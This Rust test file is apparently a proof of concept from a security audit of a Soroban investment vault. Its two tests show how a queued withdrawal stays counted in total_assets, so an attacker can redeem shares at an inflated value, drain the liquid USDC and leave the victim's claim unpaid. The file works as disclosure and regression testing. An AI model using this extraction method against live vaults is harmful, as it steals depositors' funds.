// Heliobond zombie-hunt PoC — VULNERABLE variant (integration test).
// Copied to investment_vault/tests/poc_vulnerable.rs by ci/run.sh and run with
//   cargo test -p investment-vault --test poc_vulnerable -- --nocapture
// Self-contained harness (does not use the crate's broken src/test.rs module).
//
// Scenario (7-decimal USDC): victim 40,000; attacker 10,000; admin funds
// 15,000 (30% utilisation); victim withdraws all -> queued; attacker drains
// the immediately-payable liquid at the inflated NAV.
#![cfg(test)]

use investment_vault::{InvestmentVault, InvestmentVaultClient};
use soroban_sdk::{
    testutils::{Address as _, Ledger as _},
    token::{StellarAssetClient, TokenClient},
    Address, BytesN, Env, String,
};

mod registry_contract {
    soroban_sdk::contractimport!(file = "../target/wasm32v1-none/release/project_registry.wasm");
}

const MIN_LOCK_PERIOD: u64 = 86_400;

fn metadata_hash(env: &Env) -> BytesN<32> {
    BytesN::from_array(env, &[7u8; 32])
}

struct S {
    env: Env,
    vault_client: InvestmentVaultClient<'static>,
    vault_address: Address,
    usdc_sac: Address,
    registry: Address,
}

fn setup() -> S {
    let env = Env::default();
    env.mock_all_auths();
    let admin = Address::generate(&env);
    let registry_id = env.register(registry_contract::WASM, (&admin, &admin));
    let usdc_admin = Address::generate(&env);
    let usdc_sac = env.register_stellar_asset_contract_v2(usdc_admin.clone()).address();
    let contract_id = env.register(InvestmentVault, (&admin, &usdc_sac, &registry_id));
    let vault_client = InvestmentVaultClient::new(&env, &contract_id);
    S { env, vault_client, vault_address: contract_id, usdc_sac, registry: registry_id }
}

fn mint_usdc(env: &Env, usdc_sac: &Address, to: &Address, amount: i128) {
    StellarAssetClient::new(env, usdc_sac).mint(to, &amount);
}

fn create_project(s: &S) -> u32 {
    let registry_client = registry_contract::Client::new(&s.env, &s.registry);
    let creator = Address::generate(&s.env);
    registry_client.set_whitelist(&creator, &true);
    registry_client.create_project(
        &creator,
        &String::from_str(&s.env, "ipfs://poc-double-count"),
        &0u64,
        &metadata_hash(&s.env),
    )
}

#[test]
fn poc_vulnerable_queued_claim_double_count() {
    let s = setup();
    let victim = Address::generate(&s.env);
    let attacker = Address::generate(&s.env);

    let victim_deposit: i128 = 40_000_0000000;
    let attacker_deposit: i128 = 10_000_0000000;
    mint_usdc(&s.env, &s.usdc_sac, &victim, victim_deposit);
    mint_usdc(&s.env, &s.usdc_sac, &attacker, attacker_deposit);
    let victim_shares = s.vault_client.deposit(&victim, &victim_deposit);
    let attacker_shares = s.vault_client.deposit(&attacker, &attacker_deposit);

    let project_id = create_project(&s);
    s.vault_client.fund_project(&project_id, &15_000_0000000);

    s.env.ledger().with_mut(|li| {
        li.timestamp += MIN_LOCK_PERIOD + 1;
        li.sequence_number += 10;
    });

    let usdc = TokenClient::new(&s.env, &s.usdc_sac);
    let ta_before = s.vault_client.total_assets();
    let liquid_before = usdc.balance(&s.vault_address);
    let victim_claim = s.vault_client.convert_to_assets(&victim_shares);
    assert!(
        victim_claim > liquid_before,
        "precondition failed: victim claim {} must exceed liquid {}",
        victim_claim,
        liquid_before
    );

    let paid_victim = s.vault_client.withdraw(&victim, &victim_shares, &0);
    assert_eq!(paid_victim, 0, "victim withdrawal must be queued");
    assert_eq!(s.vault_client.balance(&victim), 0, "victim shares burned");

    let ta_after_queue = s.vault_client.total_assets();
    let liquid_after_queue = usdc.balance(&s.vault_address);
    let supply_after = s.vault_client.total_supply();

    assert_eq!(
        ta_after_queue, ta_before,
        "BUG CONFIRMED: total_assets did not fall by the queued claim"
    );
    assert!(
        ta_after_queue > liquid_after_queue,
        "BUG CONFIRMED: NAV still counts assets committed to the queue"
    );

    let mut shares_to_burn: i128 = if ta_after_queue > 0 {
        liquid_after_queue * supply_after / ta_after_queue
    } else {
        0
    };
    if shares_to_burn > attacker_shares {
        shares_to_burn = attacker_shares;
    }
    while shares_to_burn > 0
        && s.vault_client.convert_to_assets(&shares_to_burn) > liquid_after_queue
    {
        shares_to_burn -= 1;
    }
    assert!(shares_to_burn > 0, "attacker must be able to redeem");

    let attacker_cash_before = usdc.balance(&attacker);
    let paid_attacker = s.vault_client.withdraw(&attacker, &shares_to_burn, &0);
    let attacker_cash = usdc.balance(&attacker);
    assert_eq!(attacker_cash - attacker_cash_before, paid_attacker);

    let fair_ta = ta_after_queue - victim_claim;
    let fair_paid = shares_to_burn * fair_ta / supply_after;
    let extraction = paid_attacker - fair_paid;

    let ta_final = s.vault_client.total_assets();
    let liquid_final = usdc.balance(&s.vault_address);
    let victim_paid_by_claim = s.vault_client.claim();

    assert!(extraction > 0, "BUG CONFIRMED: attacker overpaid by {}", extraction);
    assert!(
        ta_final < victim_claim,
        "BUG CONFIRMED: total_assets {} < queued liabilities {}",
        ta_final,
        victim_claim
    );
    assert_eq!(victim_paid_by_claim, 0, "queue cannot be paid: liquid drained");
    let victim_shortfall = victim_claim - ta_final;

    println!(
        "POC_JSON {{\"test\":\"poc_vulnerable_queued_claim_double_count\",\
\"victim_deposit\":{},\"attacker_deposit\":{},\
\"ta_before\":{},\"liquid_before\":{},\"victim_shares\":{},\"attacker_shares\":{},\
\"victim_claim\":{},\"ta_after_queue\":{},\"liquid_after_queue\":{},\"supply_after\":{},\
\"attacker_shares_burned\":{},\"paid_attacker\":{},\"fair_paid\":{},\"extraction\":{},\
\"ta_final\":{},\"liquid_final\":{},\"victim_paid_by_claim\":{},\"victim_shortfall\":{},\
\"attacker_net_profit\":{}}}",
        victim_deposit,
        attacker_deposit,
        ta_before,
        liquid_before,
        victim_shares,
        attacker_shares,
        victim_claim,
        ta_after_queue,
        liquid_after_queue,
        supply_after,
        shares_to_burn,
        paid_attacker,
        fair_paid,
        extraction,
        ta_final,
        liquid_final,
        victim_paid_by_claim,
        victim_shortfall,
        attacker_cash - attacker_cash_before - attacker_deposit
    );
}

#[test]
fn poc_vulnerable_max_extraction_small_stake() {
    let s = setup();
    let victim = Address::generate(&s.env);
    let attacker = Address::generate(&s.env);

    let victim_deposit: i128 = 40_000_0000000;
    let attacker_deposit: i128 = 200_0000000;
    mint_usdc(&s.env, &s.usdc_sac, &victim, victim_deposit);
    mint_usdc(&s.env, &s.usdc_sac, &attacker, attacker_deposit);
    let victim_shares = s.vault_client.deposit(&victim, &victim_deposit);
    let attacker_shares = s.vault_client.deposit(&attacker, &attacker_deposit);

    let project_id = create_project(&s);
    s.vault_client.fund_project(&project_id, &1_000_0000000);

    s.env.ledger().with_mut(|li| {
        li.timestamp += MIN_LOCK_PERIOD + 1;
        li.sequence_number += 10;
    });

    let usdc = TokenClient::new(&s.env, &s.usdc_sac);
    let liquid_before = usdc.balance(&s.vault_address);
    let victim_claim = s.vault_client.convert_to_assets(&victim_shares);
    assert!(victim_claim > liquid_before, "precondition: victim queues");

    assert_eq!(s.vault_client.withdraw(&victim, &victim_shares, &0), 0);
    let ta_after_queue = s.vault_client.total_assets();
    let supply_after = s.vault_client.total_supply();
    let liquid_after_queue = usdc.balance(&s.vault_address);

    let mut shares_to_burn: i128 = liquid_after_queue * supply_after / ta_after_queue;
    if shares_to_burn > attacker_shares {
        shares_to_burn = attacker_shares;
    }
    while shares_to_burn > 0
        && s.vault_client.convert_to_assets(&shares_to_burn) > liquid_after_queue
    {
        shares_to_burn -= 1;
    }

    let cash_before = usdc.balance(&attacker);
    let paid = s.vault_client.withdraw(&attacker, &shares_to_burn, &0);
    let cash_after = usdc.balance(&attacker);
    let fair_ta = ta_after_queue - victim_claim;
    let fair_paid = shares_to_burn * fair_ta / supply_after;
    let extraction = paid - fair_paid;
    let ta_final = s.vault_client.total_assets();

    assert!(
        extraction > victim_claim * 9 / 10,
        "expected near-total diversion: extraction {} vs claim {}",
        extraction,
        victim_claim
    );
    assert!(ta_final < victim_claim, "insolvent");
    assert_eq!(s.vault_client.claim(), 0, "queue unpaid");

    println!(
        "POC_JSON {{\"test\":\"poc_vulnerable_max_extraction_small_stake\",\
\"victim_deposit\":{},\"attacker_deposit\":{},\
\"victim_shares\":{},\"attacker_shares\":{},\"victim_claim\":{},\
\"ta_after_queue\":{},\"liquid_after_queue\":{},\"supply_after\":{},\
\"attacker_shares_burned\":{},\"paid_attacker\":{},\"fair_paid\":{},\"extraction\":{},\
\"ta_final\":{},\"attacker_net_profit\":{}}}",
        victim_deposit,
        attacker_deposit,
        victim_shares,
        attacker_shares,
        victim_claim,
        ta_after_queue,
        liquid_after_queue,
        supply_after,
        shares_to_burn,
        paid,
        fair_paid,
        extraction,
        ta_final,
        cash_after - cash_before - attacker_deposit
    );
}
